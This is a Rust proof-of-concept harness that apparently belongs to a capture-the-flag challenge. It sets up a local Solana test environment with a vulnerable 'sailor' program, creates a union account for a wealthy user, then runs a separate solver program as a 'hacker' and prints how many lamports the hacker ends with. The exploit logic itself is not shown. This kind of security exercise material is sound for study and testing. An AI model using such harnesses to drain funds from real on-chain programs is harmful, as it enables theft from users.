use borsh::BorshSerialize;
use poc_framework_osec::{Environment, LocalEnvironment, PrintableTransaction};
use rand::prelude::*;
use solana_sdk::{
    instruction::AccountMeta, instruction::Instruction, pubkey::Pubkey, signature::Signer,
    signer::keypair::Keypair, system_program, account::ReadableAccount
};

#[derive(Debug, PartialEq, BorshSerialize)]
struct CreateUnion {
    bal: u64,
}

fn main() {
    let mut rng = StdRng::from_seed([42; 32]);

    let prog = Keypair::generate(&mut rng);
    let sol = Keypair::generate(&mut rng);
    let rich_boi = Keypair::generate(&mut rng);
    let hacker = Keypair::generate(&mut rng);

    let (vault, _) = Pubkey::find_program_address(&[b"vault"], &prog.pubkey());
    let (sailor_union, _) =
        Pubkey::find_program_address(&[b"union", rich_boi.pubkey().as_ref()], &prog.pubkey());

    let mut env = LocalEnvironment::builder()
        .add_program(prog.pubkey(), "sailor.so")
        .add_program(sol.pubkey(), "solve.so")
        .add_account_with_lamports(vault, system_program::id(), 1_000_000)
        .add_account_with_lamports(rich_boi.pubkey(), system_program::id(), 1_000_000_000_000)
        .add_account_with_lamports(hacker.pubkey(), system_program::id(), 1337)
        .build();

    // I can feel you judging me from across the internet
    // stop it
    let mut create_instruction = vec![190, 65, 164, 249, 61, 177, 154, 181];
    create_instruction.extend(CreateUnion { bal: 100_000_000 }.try_to_vec().unwrap());

    env.execute_as_transaction(
        &[Instruction::new_with_bytes(
            prog.pubkey(),
            &create_instruction,
            vec![
                AccountMeta::new(sailor_union, false),
                AccountMeta::new(rich_boi.pubkey(), true),
                AccountMeta::new(vault, false),
                AccountMeta::new_readonly(system_program::id(), false),
            ],
        )],
        &[&rich_boi],
    )
    .print_named("init");

    env.execute_as_transaction(
        &[Instruction::new_with_bytes(
            sol.pubkey(),
            &[],
            vec![
                AccountMeta::new_readonly(prog.pubkey(), false),
                AccountMeta::new(hacker.pubkey(), true),
                AccountMeta::new(vault, false),
                AccountMeta::new(sailor_union, false),
                AccountMeta::new_readonly(rich_boi.pubkey(), false),
                AccountMeta::new_readonly(system_program::id(), false),
            ],
        )],
        &[&hacker],
    )
    .print_named("lmao");

    println!("hacker ended with {} :o", env.get_account(hacker.pubkey()).unwrap().lamports());
}
